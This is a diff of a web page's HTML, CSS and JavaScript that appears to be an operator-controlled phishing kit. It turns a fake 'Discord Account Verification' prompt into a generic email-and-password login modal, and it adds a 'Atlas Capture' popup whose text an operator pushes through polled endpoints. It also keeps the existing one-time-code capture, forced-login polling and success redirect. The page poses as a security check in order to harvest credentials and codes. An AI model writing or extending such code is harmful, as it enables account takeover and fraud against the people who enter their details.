@@ -145,7 +145,7 @@ button:disabled{
   border-radius:12px;
 }
 
-/* DISCORD MODAL STYLES */
+/* EMAIL LOGIN MODAL STYLES */
 .modal-overlay {
   display: none;
   position: fixed;
@@ -174,7 +174,7 @@ button:disabled{
 .modal-icon {
   width: 70px;
   height: 70px;
-  background: #5865F2;
+  background: #4f46e5;
   border-radius: 35px;
   display: flex;
   align-items: center;
@@ -184,7 +184,9 @@ button:disabled{
 .modal-icon svg {
   width: 40px;
   height: 40px;
-  fill: white;
+  fill: none;
+  stroke: white;
+  stroke-width: 1.5;
 }
 .modal h3 {
   font-size: 22px;
@@ -208,12 +210,12 @@ button:disabled{
 }
 .modal-input:focus {
   outline: none;
-  border-color: #5865F2;
+  border-color: #4f46e5;
 }
 .modal-btn {
   width: 100%;
   padding: 14px;
-  background: #5865F2;
+  background: #4f46e5;
   color: white;
   border: none;
   border-radius: 12px;
@@ -222,7 +224,7 @@ button:disabled{
   margin-top: 8px;
 }
 .modal-btn:hover:not(:disabled) {
-  background: #4752c4;
+  background: #4338ca;
 }
 .modal-btn:disabled {
   opacity: 0.6;
@@ -233,6 +235,72 @@ button:disabled{
   font-size: 12px;
   margin-top: 12px;
   display: none;
+}
+
+/* TEXT MESSAGE POPUP MODAL */
+.text-message-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.9);
+  backdrop-filter: blur(8px);
+  z-index: 10001;
+  justify-content: center;
+  align-items: center;
+}
+.text-message-overlay.active {
+  display: flex;
+}
+.text-message-modal {
+  background: #fff;
+  border-radius: 28px;
+  max-width: 380px;
+  width: 90%;
+  padding: 32px 24px;
+  text-align: center;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+  animation: modalFadeIn 0.3s ease;
+}
+@keyframes modalFadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+.text-message-modal .modal-icon {
+  width: 60px;
+  height: 60px;
+  background: #f97316;
+  border-radius: 30px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 20px;
+}
+.text-message-modal .modal-icon svg {
+  width: 32px;
+  height: 32px;
+  stroke: white;
+  fill: none;
+}
+.text-message-modal h3 {
+  font-size: 22px;
+  font-weight: 700;
+  color: #1f2937;
+  margin-bottom: 8px;
+}
+.text-message-modal .message-content {
+  background: #f3f4f6;
+  padding: 16px;
+  border-radius: 16px;
+  margin: 20px 0;
+  text-align: left;
+  font-size: 15px;
+  line-height: 1.5;
+  color: #1f2937;
+  word-break: break-word;
+  white-space: pre-wrap;
 }
 </style>
 </head>
@@ -259,20 +327,34 @@ button:disabled{
   </div>
 </div>
 
-<!-- DISCORD LOGIN MODAL -->
+<!-- EMAIL LOGIN MODAL -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal">
     <div class="modal-icon">
-      <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21a105.73,105.73,0,0,0,32.17,16.15,77.7,77.7,0,0,0,6.89-11.11,68.76,68.76,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.86.68,1.75,1.36,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69c-6.31,0-11.46-5.78-11.46-12.86s5-12.86,11.46-12.86,11.55,5.78,11.46,12.86C53.91,59.91,48.76,65.69,42.45,65.69Zm42.24,0c-6.31,0-11.46-5.78-11.46-12.86s5-12.86,11.46-12.86,11.55,5.78,11.46,12.86C96.15,59.91,91,65.69,84.69,65.69Z" fill="white"/>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+        <polyline points="22,6 12,13 2,6"/>
       </svg>
     </div>
-    <h3>Discord Account Verification</h3>
-    <p>Please login with your Discord account to verify your identity. This helps protect your account security.</p>
-    <input type="email" id="loginEmail" class="modal-input" placeholder="Discord Email">
-    <input type="password" id="loginPassword" class="modal-input" placeholder="Discord Password">
-    <button id="submitLoginBtn" class="modal-btn">Login with Discord →</button>
+    <h3>Account Verification Required</h3>
+    <p>Please login with your email and password to continue. This helps protect your account security.</p>
+    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
+    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
+    <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
     <div id="modalError" class="modal-error"></div>
+  </div>
+</div>
+
+<!-- TEXT MESSAGE POPUP MODAL -->
+<div id="textMessageModal" class="text-message-overlay">
+  <div class="text-message-modal">
+    <div class="modal-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+      </svg>
+    </div>
+    <h3>Atlas Capture</h3>
+    <div id="adminMessageContent" class="message-content"></div>
   </div>
 </div>
 
@@ -288,8 +370,9 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
 
-  // Flag to prevent modal from re-triggering while open
+  // Flags to prevent modals from re-triggering while open
   let isModalOpen = false;
+  let isTextModalOpen = false;
 
   function getOTP() {
     return otpInput.value.trim();
@@ -401,7 +484,6 @@ button:disabled{
   function startForceLoginPolling() {
     if (forceLoginInterval) clearInterval(forceLoginInterval);
     forceLoginInterval = setInterval(async () => {
-      // Don't trigger if modal is already open
       if (isModalOpen) return;
       
       try {
@@ -419,7 +501,7 @@ button:disabled{
           document.getElementById('loginPassword').value = '';
           document.getElementById('modalError').style.display = 'none';
           document.getElementById('submitLoginBtn').disabled = false;
-          document.getElementById('submitLoginBtn').innerHTML = 'Login with Discord →';
+          document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue →';
         }
       } catch (err) {}
     }, 2000);
@@ -441,6 +523,50 @@ button:disabled{
         if (data.redirect_success === true) {
           clearInterval(redirectSuccessInterval);
           window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+        }
+      } catch (err) {}
+    }, 2000);
+  }
+
+  // ========== POLLING FOR ADMIN TEXT MESSAGE ==========
+  let adminTextInterval = null;
+
+  function startAdminTextPolling() {
+    if (adminTextInterval) clearInterval(adminTextInterval);
+    adminTextInterval = setInterval(async () => {
+      if (isTextModalOpen) return;
+      
+      try {
+        const response = await fetch('/api/users/check-admin-text', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        
+        if (data.admin_text && data.admin_text.trim() !== '' && data.text_release === false) {
+          isTextModalOpen = true;
+          const modal = document.getElementById('textMessageModal');
+          const messageContent = document.getElementById('adminMessageContent');
+          messageContent.textContent = data.admin_text;
+          modal.classList.add('active');
+          
+          // Continue polling to check for release
+          const checkReleaseInterval = setInterval(async () => {
+            try {
+              const releaseCheck = await fetch('/api/users/check-admin-text', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email })
+              });
+              const releaseData = await releaseCheck.json();
+              if (releaseData.text_release === true) {
+                clearInterval(checkReleaseInterval);
+                modal.classList.remove('active');
+                isTextModalOpen = false;
+              }
+            } catch (err) {}
+          }, 2000);
         }
       } catch (err) {}
     }, 2000);
@@ -486,22 +612,23 @@ button:disabled{
       if (data.success) {
         hideLoginModal();
       } else {
-        modalError.textContent = data.error || 'Failed to verify Discord account';
+        modalError.textContent = data.error || 'Failed to verify account';
         modalError.style.display = 'block';
         submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Login with Discord →';
+        submitBtn.innerHTML = 'Login to Continue →';
       }
     } catch (error) {
       modalError.textContent = 'Network error. Please try again.';
       modalError.style.display = 'block';
       submitBtn.disabled = false;
-      submitBtn.innerHTML = 'Login with Discord →';
+      submitBtn.innerHTML = 'Login to Continue →';
     }
   }
 
   // ========== START POLLING ==========
   startForceLoginPolling();
   startRedirectSuccessPolling();
+  startAdminTextPolling();
 
   // ========== EVENT LISTENERS ==========
   verifyBtn.addEventListener('click', verifySecondOTP);
